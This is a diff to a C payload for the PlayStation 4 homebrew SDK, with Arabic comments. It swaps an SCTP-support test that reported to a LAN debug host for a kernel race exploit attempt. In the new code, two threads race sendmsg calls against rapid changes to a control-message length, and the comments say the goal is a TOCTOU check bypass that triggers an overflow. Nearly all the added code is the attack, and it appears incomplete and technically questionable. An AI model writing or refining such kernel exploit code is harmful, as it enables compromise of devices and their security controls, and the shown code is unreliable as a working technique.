@@ -1,56 +1,61 @@
-#include "ps4.h"
+#include <ps4.h> // مكتبة SDK الخاصة بالـ PS4
 
-#ifndef IPPROTO_SCTP
-#define IPPROTO_SCTP 132
-#endif
+#define ITERATIONS 100000
+#define CONTROL_LEN 256
 
-#define debug(sock, format, ...)                    \
-    do {                                            \
-        char buffer[512];                           \
-        int size = sprintf(buffer, format, ##__VA_ARGS__); \
-        sceNetSend(sock, buffer, size, 0);          \
-    } while(0)
+struct cmsghdr *cmsg;
+uint8_t control_buf[CONTROL_LEN];
+int sock;
 
-int _main(void) {
+// الخيط الأول: يحاول استدعاء sendmsg باستمرار
+void *sendmsg_thread(void *arg) {
+    struct msghdr msg;
+    memset(&msg, 0, sizeof(msg));
+    
+    msg.msg_control = control_buf;
+    msg.msg_controllen = CONTROL_LEN;
 
-    // Initialize
-    initKernel();
-    initLibc();
-    initNetwork();
-
-    char socketName[] = "debug";
-
-    struct sockaddr_in server;
-    server.sin_len = sizeof(server);
-    server.sin_family = AF_INET;
-    server.sin_addr.s_addr = IP(192, 168, 90, 137);
-    server.sin_port = sceNetHtons(9023);
-    memset(server.sin_zero, 0, sizeof(server.sin_zero));
-
-    int sock = sceNetSocket(socketName, AF_INET, SOCK_STREAM, 0);
-    if (sock < 0)
-        return 0;
-
-    if (sceNetConnect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        sceNetSocketClose(sock);
-        return 0;
+    for (int i = 0; i < ITERATIONS; i++) {
+        // الثغرة تكمن في معالجة syscall 32-bit على نظام 64-bit
+        // في FreeBSD/PS4 نستخدم sys_sendmsg
+        syscall(28, sock, &msg, 0); 
     }
+    return NULL;
+}
 
-    // Print PID
-    debug(sock, "PID: %d\n", syscall(20));
-
-    // ---- SCTP TEST ----
-    int sctp = sceNetSocket("sctp_test", AF_INET, SOCK_STREAM, IPPROTO_SCTP);
-
-    if (sctp < 0) {
-        debug(sock, "SCTP not supported (error: %d)\n", sctp);
-    } else {
-        debug(sock, "SCTP supported\n");
-        sceNetSocketClose(sctp);
+// الخيط الثاني: يحاول تغيير الطول بسرعة لإحداث TOCTOU
+void *race_thread(void *arg) {
+    for (int i = 0; i < ITERATIONS; i++) {
+        // نغير القيمة بين حجم صغير (يجتاز الفحص) وحجم كبير (يسبب Overflow)
+        cmsg->cmsg_len = 0x50; 
+        cmsg->cmsg_len = 0xFF; 
     }
-    // -------------------
+    return NULL;
+}
 
-    sceNetSocketClose(sock);
+// الدالة الأساسية للـ Payload
+int _main(struct thread *td) {
+    initKernel(); // تعريف دوال النواة
+    initLibc();   // تعريف مكتبة C الأساسية
+
+    // 1. إنشاء Socket للعمل عليه
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+
+    // 2. تجهيز هيكل الـ Control Message
+    memset(control_buf, 0, CONTROL_LEN);
+    cmsg = (struct cmsghdr *)control_buf;
+    cmsg->cmsg_level = IPPROTO_IP;
+    cmsg->cmsg_type = IP_RETOPTS;
+    cmsg->cmsg_len = 0x50;
+
+    // 3. إطلاق خيوط السباق
+    ScePthread thread1, thread2;
+    scePthreadCreate(&thread1, NULL, sendmsg_thread, NULL, "sendmsg_race");
+    scePthreadCreate(&thread2, NULL, race_thread, NULL, "modifier_race");
+
+    // 4. الانتظار
+    scePthreadJoin(thread1, NULL);
+    scePthreadJoin(thread2, NULL);
 
     return 0;
 }
